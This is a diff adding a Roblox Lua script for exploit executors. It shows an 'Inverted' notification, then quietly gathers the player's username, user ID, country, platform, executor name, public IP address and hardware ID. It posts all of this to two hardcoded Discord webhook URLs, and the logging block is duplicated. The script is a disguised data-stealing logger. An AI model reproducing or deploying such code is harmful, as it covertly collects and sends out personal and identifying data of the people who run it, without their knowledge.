@@ -1,0 +1,213 @@
+game.StarterGui:SetCore("SendNotification",  {
+ Title = "Inverted";
+ Text = "Inverted";
+ Icon = "http://www.roblox.com/asset/?id=951528747";
+ Duration = 98083905839058095809389034;
+ Button1 = "Close";
+ Callback = NotificationBindable;
+}
+)	
+                function checkexploit()
+		if syn then return "Synapse X"
+		elseif SENTINEL_V2 then return "Sentinel"
+		elseif iskrnlclosure then return "krnl"
+		else return "Unrecognized"
+		end
+	end
+
+	local http_request = http_request;
+	if syn then
+		http_request = syn.request
+	elseif SENTINEL_V2 then
+		function http_request(tb)
+			return {
+				StatusCode = 200;
+				Body = request(tb.Url, tb.Method, (tb.Body or ''))
+			}
+		end
+	end
+
+	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+	local decoded = game:GetService('HttpService'):JSONDecode(body)
+	local hwid_list = {"Syn-Fingerprint", "Krnl-Hwid"};
+	local hwid = ""
+
+	for i, v in next, hwid_list do
+		if decoded.headers[v] then
+			hwid = decoded.headers[v];
+			break
+		end
+	end
+
+	if hwid then
+		finalhwid = hwid
+	else
+		finalhwid = "Unknown or unsupported exploit"
+	end
+
+	local data =
+		{
+			["content"] = "@everyone",
+			["embeds"] = {{
+				["title"] = "Roblox Script Logger",
+				["description"] = "",
+				["thumbnail"] = {
+					["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
+				},
+				["footer"] = {
+					["text"] = "wuss#1241",
+				},
+				["fields"] = {
+					{
+						["name"] = "**Username**",
+						["value"] = "```"..game.Players.LocalPlayer.Name.."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**User ID**",
+						["value"] = "```"..game.Players.LocalPlayer.UserId.."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**Country**",
+						["value"] = "```"..game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/"..tostring(game:HttpGet("https://api.ipify.org")).."?fields=1"))["country"].."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**Platform**",
+						["value"] = "```"..string.sub(tostring(game:GetService("UserInputService"):GetPlatform()), 15).."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**Exploit**",
+						["value"] = "```"..checkexploit().."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**IP Address**",
+						["value"] = "```"..tostring(game:HttpGet("http://api.ipify.org")).."```",
+						["inline"] = false
+					},
+					{
+						["name"] = "**HWID**",
+						["value"] = "```"..tostring(finalhwid).."```",
+						["inline"] = false
+					}
+				}
+			}
+			}}
+
+
+
+
+
+
+
+	local url= "https://discord.com/api/webhooks/1052477035525709854/AjNGt8FgvJq_a4e2dQTBwdnWRbdV_cIsbGXfx_tJYceufHppHa_kjyL_eemcdFvDpyZs"
+
+
+	http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
+
+	wait(1)
+	function checkexploit()
+		if syn then return "Synapse X"
+		elseif SENTINEL_V2 then return "Sentinel"
+		elseif iskrnlclosure then return "krnl"
+		else return "Unrecognized"
+		end
+	end
+
+	local http_request = http_request;
+	if syn then
+		http_request = syn.request
+	elseif SENTINEL_V2 then
+		function http_request(tb)
+			return {
+				StatusCode = 200;
+				Body = request(tb.Url, tb.Method, (tb.Body or ''))
+			}
+		end
+	end
+
+	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+	local decoded = game:GetService('HttpService'):JSONDecode(body)
+	local hwid_list = {"Syn-Fingerprint", "Krnl-Hwid"};
+	local hwid = ""
+
+	for i, v in next, hwid_list do
+		if decoded.headers[v] then
+			hwid = decoded.headers[v];
+			break
+		end
+	end
+
+	if hwid then
+		finalhwid = hwid
+	else
+		finalhwid = "Unknown or unsupported exploit"
+	end
+
+	local data =
+		{
+			["content"] = "@everyone",
+			["embeds"] = {{
+				["title"] = "Roblox Script Logger",
+				["description"] = "",
+				["thumbnail"] = {
+					["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
+				},
+				["footer"] = {
+					["text"] = "wuss#1241",
+				},
+				["fields"] = {
+					{
+						["name"] = "**Username**",
+						["value"] = "```"..game.Players.LocalPlayer.Name.."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**User ID**",
+						["value"] = "```"..game.Players.LocalPlayer.UserId.."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**Country**",
+						["value"] = "```"..game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/"..tostring(game:HttpGet("https://api.ipify.org")).."?fields=1"))["country"].."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**Platform**",
+						["value"] = "```"..string.sub(tostring(game:GetService("UserInputService"):GetPlatform()), 15).."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**Exploit**",
+						["value"] = "```"..checkexploit().."```",
+						["inline"] = true
+					},
+					{
+						["name"] = "**IP Address**",
+						["value"] = "```"..tostring(game:HttpGet("http://api.ipify.org")).."```",
+						["inline"] = false
+					},
+					{
+						["name"] = "**HWID**",
+						["value"] = "```"..tostring(finalhwid).."```",
+						["inline"] = false
+					}
+				}
+			}
+			}}
+
+
+
+
+
+
+
+	local url= "https://discord.com/api/webhooks/1287206674695979100/qhzTqo1xwtVsYPvs9fDAA3Y_cSOQfig39mki5qwrY-rlTqDiXU4tmZ1TY_j3FQnrabxB"
+
+
+	http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
+
+	wait(1)
